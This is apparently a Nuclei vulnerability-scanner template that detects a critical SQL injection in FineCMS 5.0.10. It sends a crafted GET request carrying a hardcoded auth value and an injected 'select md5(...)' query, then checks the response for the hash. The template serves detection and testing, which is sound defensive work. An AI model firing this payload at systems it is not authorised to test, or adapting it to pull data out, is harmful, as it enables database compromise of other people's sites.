http:
- matchers:
  - type: word
    words:
    - '{{md5({{num}})}}'
  method: GET
  path:
  - '{{BaseURL}}/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{num}})%27'
id: finecms-sqli
info:
  author: ritikchaddha
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-89
  description: 'FineCMS 5.0.10 contains a SQL injection vulnerability. An attacker
    can possibly obtain sensitive information from a database, modify data, and execute
    unauthorized administrative operations in the context of the affected site.

    '
  metadata:
    max-request: 1
  name: FineCMS 5.0.10 - SQL Injection
  reference:
  - https://blog.csdn.net/dfdhxb995397/article/details/101385340
  severity: critical
  tags: finecms,sqli,vuln
variables:
  num: '999999999'
